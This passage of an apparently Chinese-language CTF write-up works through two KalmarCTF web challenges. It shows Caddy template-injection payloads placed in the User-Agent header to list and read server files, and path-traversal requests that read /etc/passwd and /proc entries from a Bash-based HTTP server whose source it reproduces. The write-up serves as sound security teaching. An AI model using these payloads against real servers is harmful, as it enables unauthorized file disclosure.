+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import 指令名</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>块</strong></p>
+<p><strong>块</strong>由一对花括号完成的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">... &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>花括号前写所服务的域名，花括号后填写对应的指令</p>
+<p>此外在<strong>片段</strong>中有一个<strong>特别的指令</strong>：<code>templates</code>-模板，类似于python中的Jinja2模板引擎，进行实时渲染</p>
+<p>对应的官方文档：<a target="_blank" rel="noopener" href="https://caddyserver.com/docs/modules/http.handlers.templates">Module http.handlers.templates - Caddy Documentation (caddyserver.com)</a></p>
+<p>根据<code>templates</code>对应的语法规则（<code>&#123;&#123;指令&#125;&#125;</code>）尝试能不能和Python一样进行模板注入</p>
+<p>由于修改UA（<code>User-Agent</code>）比较方便，所以我选择了<code>ua.caddy.chal-kalmarc.tf</code>，将UA修改为<code>&#123;&#123;7*7&#125;&#125;</code>发现服务端返回了<code>500</code>错误，发现这个思路应该是有戏，修改为<code>&#123;&#123;.Host&#125;&#125;</code>发现最后页面返回了<code>User-Agent: ua.caddy.chal-kalmarc.tf</code>，发现确实可以进行类似模板注入的操作，而官方文档中有两个可以让我们读到<code>flag</code>的指令</p>
+<p>1.<code>readFile</code></p>
+<p><em>Reads and returns the contents of another file, as-is. Note that the contents are NOT escaped, so you should only read trusted files.</em><br><em>按原样读取并返回另一个文件的内容。请注意，内容不会被转义，因此您应该只读取受信任的文件。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;readFile &quot;path/to/file.html&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.<code>listFiles</code></p>
+<p><em>Returns a list of the files in the given directory, which is relative to the template context’s file root.</em><br><em>返回给定目录中的文件列表，该列表相对于模板上下文的文件根目录。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;listFiles &quot;/mydir&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因此我们修改UA为<code>&#123;&#123;listFiles "/"&#125;&#125;</code>获得flag的文件名： <code>CVGjuzCIVR99QNpJTLtBn9</code></p>
+<p>然后再修改UA为<code>&#123;&#123;readFile "/CVGjuzCIVR99QNpJTLtBn9"&#125;&#125;</code>，最后成功获取flag：</p>
+<p><code>kalmar&#123;Y0_d4wg_I_h3rd_y0u_l1k3_templates_s0_I_put_4n_template_1n_y0ur_template_s0_y0u_c4n_readFile_wh1le_y0u_executeTemplate&#125;</code></p>
+<h2 id="BadAss-Server-for-Hypertext"><a href="#BadAss-Server-for-Hypertext" class="headerlink" title="BadAss Server for Hypertext"></a>BadAss Server for Hypertext</h2><p><em><strong>强悍的超文本服务器</strong></em></p>
+<h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><blockquote>
+<p>I wrote my own HTTP server. I have to admit: the code is a bit cursed, but it works! So no problem, right?</p>
+<p><em>我自己写了一个HTTP服务器。我必须承认：代码有点诡异，但是它能正常工作！所以没问题，对吗？</em></p>
+</blockquote>
+<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ul>
+<li><code>/proc</code>目录以及子目录的功能及其作用</li>
+<li>shell语言</li>
+<li>通配符</li>
+</ul>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一个<strong>黑盒测试</strong>，点击题目链接后发现就一个按钮可以交互</p>
+<p><img src="/posts/fbcd83ad/image-20240324151813152.png" alt="image-20240324151813152"></p>
+<p>点击这个按钮，跳转到<code>http://chal-kalmarc.tf:8080/assets/26c3f25922f71af3372ac65a75cd3b11/iceberg.jpg</code>，没用任何信息。查看初始页面的源码发现被隐藏了另一个按钮</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &lt;a href=&quot;assets/f200d055a267ae56160198e0fcb47e5f/try_harder.txt&quot;&gt;</span><br><span class="line">	&lt;button&gt;Get the flag&lt;/button&gt;</span><br><span class="line">&lt;/a&gt; --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>再次点进去，发现就一句话：<code>Did you think it was this easy? Nah, this isn&#39;t the flag.</code></p>
+<p>也没什么实际的价值点（<del>其实后面这两个东东会被利用到</del>），然后就是无头无脑的不断尝试了<code>robots.txt</code>、抓包再发包</p>
+<p>这个过程中发现了一个比较有趣的，响应头中存在这样一个键值：<code>X-Powered-By: Bash</code>，shell语言做后端？？</p>
+<p>发现随便输入一个内容到url后<strong>如果不存在</strong>会输出为：<code>cat: /app/static/1: No such file or directory</code>，可以大胆推测后端为shell语言了</p>
+<p>然后我就开始怀疑是不是有<strong>目录创越的漏洞</strong>存在了，拦截请求包转到BP进行改包（浏览器的url中直接输入<code>..</code>会被删除，而并不会直接传会后端）将url修改为<code>/../../../../../etc/passwd</code>,返回包中出现了<code>passwd</code>中对应的内容</p>
+<p><img src="/posts/fbcd83ad/image-20240324153600061.png" alt="image-20240324153600061"></p>
+<h4 id="逻辑漏洞1："><a href="#逻辑漏洞1：" class="headerlink" title="逻辑漏洞1："></a>逻辑漏洞1：</h4><p>发现<strong>目录穿越漏洞确实存在</strong>，可以尝试直接读一下<code>/flag</code>发现根目录下不存在<code>flag</code>文件，那就只能进<code>/proc</code>目录找找对应的进程和运行目录了，一般读取<code>1</code>进程（一般赛题docker中最初的线程号为1）和<code>self</code>进程（当前指令所属的进程），一通乱尝试<code>cmdline</code>、<code>environ</code>、<code>status</code>等等发现了一些有用的东西</p>
+<p>在<code>/../../../../../proc/1/cmdline</code>尝试读取后端的运行程序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: inode/x-empty</span><br><span class="line">X-Powered-By: Bash</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">socat TCP4-LISTEN:8080,reuseaddr,fork EXEC:/app/badass_server.sh</span><br></pre></td></tr></table></figure>
+
+<p>此时我们可以找到我们的后端所属的脚本文件，我们再将它读取出来，尝试看看源码中是否存在漏洞。读取到的源码为：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># I hope there are no bugs in this source code...</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -A request_headers</span><br><span class="line"><span class="built_in">declare</span> -A response_headers</span><br><span class="line"><span class="built_in">declare</span> method</span><br><span class="line"><span class="built_in">declare</span> uri</span><br><span class="line"><span class="built_in">declare</span> protocol</span><br><span class="line"><span class="built_in">declare</span> request_body</span><br><span class="line"><span class="built_in">declare</span> status=<span class="string">&quot;200 OK&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">abort</span></span>() &#123;</span><br><span class="line">	<span class="built_in">declare</span> -gA response_headers</span><br><span class="line">	status=<span class="string">&quot;400 Bad Request&quot;</span></span><br><span class="line">	write_headers</span><br><span class="line">	<span class="keyword">if</span> [ ! -z <span class="variable">$&#123;1+x&#125;</span> ]; <span class="keyword">then</span></span><br><span class="line">		&gt;&amp;2 <span class="built_in">echo</span> <span class="string">&quot;Request aborted: <span class="variable">$1</span>&quot;</span></span><br><span class="line">		<span class="built_in">echo</span> -en <span class="variable">$1</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">	<span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">write_headers</span></span>() &#123;</span><br><span class="line">	response_headers[<span class="string">&#x27;Connection&#x27;</span>]=<span class="string">&#x27;close&#x27;</span></span><br><span class="line">	response_headers[<span class="string">&#x27;X-Powered-By&#x27;</span>]=<span class="string">&#x27;Bash&#x27;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> -en <span class="string">&quot;HTTP/1.0 <span class="variable">$status</span>\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> key <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$&#123;!response_headers[@]&#125;</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">		<span class="built_in">echo</span> -en <span class="string">&quot;<span class="variable">$&#123;key&#125;</span>: <span class="variable">$&#123;response_headers[$key]&#125;</span>\r\n&quot;</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">echo</span> -en <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">	&gt;&amp;2 <span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(date -u +&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;)</span> <span class="variable">$SOCAT_PEERADDR</span> <span class="variable">$method</span> <span class="variable">$uri</span> <span class="variable">$protocol</span> -&gt; <span class="variable">$status</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">receive_request</span></span>() &#123;</span><br><span class="line">	<span class="built_in">read</span> -d $<span class="string">&#x27;\n&#x27;</span> -a request_line</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$&#123;#request_line[@]&#125;</span> != 3 ]; <span class="keyword">then</span></span><br><span class="line">		abort <span class="string">&quot;Invalid request line&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	method=<span class="variable">$&#123;request_line[0]&#125;</span></span><br><span class="line"></span><br><span class="line">	uri=<span class="variable">$&#123;request_line[1]&#125;</span></span><br><span class="line"></span><br><span class="line">	protocol=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$&#123;request_line[2]&#125;</span>&quot;</span> | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="variable">$method</span> =~ ^(GET|HEAD)$ ]]; <span class="keyword">then</span></span><br><span class="line">		abort <span class="string">&quot;Invalid request method&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="variable">$uri</span> =~ ^/ ]]; <span class="keyword">then</span></span><br><span class="line">		abort <span class="string">&#x27;Invalid URI&#x27;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ <span class="variable">$protocol</span> != <span class="string">&#x27;HTTP/1.0&#x27;</span> ] &amp;&amp; [ <span class="variable">$protocol</span> != <span class="string">&#x27;HTTP/1.1&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line">		abort <span class="string">&#x27;Invalid protocol&#x27;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="built_in">read</span> -d $<span class="string">&#x27;\n&#x27;</span> header; <span class="keyword">do</span></span><br><span class="line">		stripped_header=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$stripped_header</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">			<span class="built_in">break</span>;</span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		header_name=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 1 | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;[:upper:]&#x27;</span> <span class="string">&#x27;[:lower:]&#x27;</span>);</span><br><span class="line">		header_value=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$header</span>&quot;</span> | <span class="built_in">cut</span> -d <span class="string">&#x27;:&#x27;</span> -f 2- | sed <span class="string">&#x27;s/^\s*//g&#x27;</span> | sed <span class="string">&#x27;s/\s*$//g&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$header_name</span>&quot;</span> ] || [[ <span class="string">&quot;<span class="variable">$header_name</span>&quot;</span> =~ [[:space:]] ]]; <span class="keyword">then</span></span><br><span class="line">			abort <span class="string">&quot;Invalid header name&quot;</span>;</span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">		<span class="comment"># If header already exists, add value to comma separated list</span></span><br><span class="line">		<span class="keyword">if</span> [[ -v request_headers[<span class="variable">$header_name</span>] ]]; <span class="keyword">then</span></span><br><span class="line">			request_headers[<span class="variable">$header_name</span>]=<span class="string">&quot;<span class="variable">$&#123;request_headers[$header_name]&#125;</span>, <span class="variable">$header_value</span>&quot;</span></span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			request_headers[<span class="variable">$header_name</span>]=<span class="string">&quot;<span class="variable">$header_value</span>&quot;</span></span><br><span class="line">		<span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">	body_length=<span class="variable">$&#123;request_headers[&quot;content-length&quot;]:-0&#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [[ ! <span class="variable">$body_length</span> =~ ^[0-9]+$ ]]; <span class="keyword">then</span></span><br><span class="line">		abort <span class="string">&quot;Invalid Content-Length&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">read</span> -N <span class="variable">$body_length</span> request_body</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">handle_request</span></span>() &#123;</span><br><span class="line">	<span class="comment"># Default: serve from static directory</span></span><br><span class="line">	path=<span class="string">&quot;/app/static<span class="variable">$uri</span>&quot;</span></span><br><span class="line">	path_last_character=$(<span class="built_in">echo</span> -n <span class="string">&quot;<span class="variable">$path</span>&quot;</span> | <span class="built_in">tail</span> -c 1)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$path_last_character</span>&quot;</span> == <span class="string">&#x27;/&#x27;</span> ]; <span class="keyword">then</span></span><br><span class="line">		path=<span class="string">&quot;<span class="variable">$&#123;path&#125;</span>index.html&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ! <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span> &gt; /dev/null; <span class="keyword">then</span></span><br><span class="line">		status=<span class="string">&quot;404 Not Found&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		mime_type=$(file --mime-type -b <span class="string">&quot;<span class="variable">$path</span>&quot;</span>)</span><br><span class="line">		file_size=$(<span class="built_in">stat</span> --<span class="built_in">printf</span>=<span class="string">&quot;%s&quot;</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">		response_headers[<span class="string">&quot;Content-Type&quot;</span>]=<span class="string">&quot;<span class="variable">$mime_type</span>&quot;</span></span><br><span class="line">		response_headers[<span class="string">&quot;Content-Length&quot;</span>]=<span class="string">&quot;<span class="variable">$file_size</span>&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">	write_headers</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$path</span>&quot;</span> 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">receive_request</span><br><span class="line">handle_request</span><br></pre></td></tr></table></figure>
+
+<p>由于是shell语言这里我想到了一些shell中的一些骚操作例如：</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;变量名&#125;  #会将变量的值进行拓展出来</span><br><span class="line">$(命令)  #会执行（）中的命令</span><br><span class="line">`命令`  #会执行` `中的命令</span><br></pre></td></tr></table></figure>
+
+<details class="tag-plugin colorful folding" ><summary><p>open , 拓展：shell语言中的部分特性</p>
+</summary><div class="body"><p><strong>特性1：展开</strong></p> <p>按照展开顺序分为：</p> <ol> <li>花括号展开（Brace Expansion）：<br>花括号展开可以用来生成一系列具有相似结构的字符串。例如，使用花括号展开可以生成一组文件名或者一组命令参数。</li> </ol> <p>示例：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#123;a,b,c&#125;</span><br><span class="line">a b c</span><br><span class="line"></span><br><span class="line">$ echo file&#123;1..3&#125;.txt</span><br><span class="line">file1.txt file2.txt file3.txt</span><br></pre></td></tr></table></figure>  <ol start="2"> <li>波浪线展开（Tilde Expansion）：<br>波浪线展开用于扩展波浪线后面的特殊字符，通常用于表示用户的主目录路径。</li> </ol> <p>示例：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo ~</span><br><span class="line">/home/username</span><br><span class="line"></span><br><span class="line">$ echo ~/Documents</span><br><span class="line">/home/username/Documents</span><br></pre></td></tr></table></figure>  <ol start="3"> <li>参数，变量，算术展开和命令替换：<br>参数展开用于访问脚本或函数的参数，变量展开用于展开变量的值，算术展开用于进行数学运算，而命令替换用于将命令的输出作为展开结果。</li> </ol> <p>示例：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ echo $HOME</span><br><span class="line">/home/username</span><br><span class="line"></span><br><span class="line">$ echo $((2 + 2))</span><br><span class="line">4</span><br><span class="line"></span><br><span class="line">$ echo $(ls)</span><br><span class="line">file1.txt file2.txt file3.txt</span><br></pre></td></tr></table></figure>  <ol start="4"> <li>单词分割（Word Splitting）：<br>单词分割用于将字符串按照特定的分隔符进行拆分，常见的分隔符包括空格、制表符和换行符。</li> </ol> <p>示例：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ string=&quot;Hello World&quot;</span><br><span class="line">$ echo $string</span><br><span class="line">Hello World</span><br><span class="line"></span><br><span class="line">$ for word in $string; do echo $word; done</span><br><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure>  <ol start="5"> <li>文件名展开（Filename Expansion）：<br>文件名展开用于匹配文件系统中的文件名模式，常见的通配符包括星号（*）和问号（?）。</li> </ol> <p>示例：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls *.txt</span><br><span class="line">file1.txt file2.txt file3.txt</span><br><span class="line"></span><br><span class="line">$ rm file?.txt</span><br></pre></td></tr></table></figure>    <p><strong>特性2：单双引号的区别</strong></p> <ul> <li><p>单引号：</p> <p>使用单引号，单引号中的内容一律被视为字符串，不进行转义，无法被扩展，<code>${}</code>、<code>$()</code>、反引号、<code>通配符</code>无法被使用</p> <p>例如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo /*</span><br><span class="line">/app /bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /swapfile /sys /tmp /usr /var</span><br><span class="line"></span><br><span class="line">#通配符不会展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &#x27;/*&#x27;</span><br><span class="line">/*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &#x27;$(date)&#x27;</span><br><span class="line">$(date)</span><br></pre></td></tr></table></figure> </li> <li><p>双引号：</p> <ul> <li><strong>变量展开</strong>：双引号内的变量会被展开，即变量的值会替换变量本身。</li> <li><strong>命令替换</strong>：双引号内的命令替换（使用<code>$()</code>或反引号&#96;&#96;）会被执行，其输出会替换命令本身。</li> <li><strong>通配符不会展开</strong>：双引号内的通配符（如<code>*</code>、<code>?</code>等）不会被作为通配符处理，而是作为普通字符。</li> <li><strong>转义字符</strong>：某些特殊字符（如<code>$</code>、<code>反引号</code>、<code>\</code>）可以通过反斜线进行转义以表示其字面意义。</li> </ul> <p>例如：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#变量展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# path=&quot;*&quot;</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;$&#123;path&#125;&quot;</span><br><span class="line">*</span><br><span class="line"></span><br><span class="line">#命令替换</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;$(date)&quot;</span><br><span class="line">2024年 03月 24日 星期日 16:55:37 CST</span><br><span class="line"></span><br><span class="line">#通配符不会展开</span><br><span class="line">root@ubuntu:/home/ubuntu/Desktop# echo &quot;*&quot;</span><br><span class="line">*</span><br></pre></td></tr></table></figure></li> </ul> <p><strong>特性3：变量展开后的字符串</strong></p> <p>1.进行变量展开后，通配符不受 <strong>展开前单双引号性质的影响</strong></p> <blockquote> <p>​	只要最后使用变量时，最外层不存在<code>&quot;&quot;</code>即可展开</p> </blockquote> <p>例如</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">path=&#x27;*&#x27;</span><br><span class="line">path_after=&quot;./*&quot;</span><br><span class="line">echo $path_after #变量替换后，最外层也无&quot;&quot;的影响，此时通配符*可被展开</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果：./badass_server.sh ./character1.sh ./character2.sh</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">path=&#x27;*&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo ”$path_after“ #变量替换后，最外层存在&quot;&quot;的影响，通配符无法展开</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">输出结果： ./*</span></span><br></pre></td></tr></table></figure>    <p>2.进行变量展开后，变量展开、命令替换<strong>受最开始赋值时的单双引号影响</strong></p> <blockquote> <p>​	若最开始时使用单引号，无论最后使用变量时，最外层存不存在引号，都无法被展开</p> </blockquote> <p>例如：</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test1</span></span><br><span class="line">path=&#x27;$(date)&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo $path_after</span><br><span class="line">path_after_after=$path_after</span><br><span class="line">echo $path_after_after</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出结果：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./$(<span class="built_in">date</span>)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./$(<span class="built_in">date</span>)</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">test2</span></span><br><span class="line">data= date</span><br><span class="line">echo $data</span><br><span class="line">path=&#x27;$&#123;data&#125;&#x27;</span><br><span class="line">path_after=&quot;./$path&quot;</span><br><span class="line">echo $path_after</span><br><span class="line">path_after_after=$path_after</span><br><span class="line">echo $path_after_after</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输出结果：</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Sun Mar 24 21:29:51     2024</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./<span class="variable">$&#123;data&#125;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">./<span class="variable">$&#123;data&#125;</span></span></span><br></pre></td></tr></table></figure> </div></details>
+
+<p>但经过尝试，发现无法通过控制<code>$path</code>这个值变为<code>$&#123;&#125;</code>使最后的cat返回<strong>命令替换的结果</strong></p>
+<p>预想结果（可以通过cat的报错获取信息，如果这种办法可行剩下的只是空格的绕过）：</p>
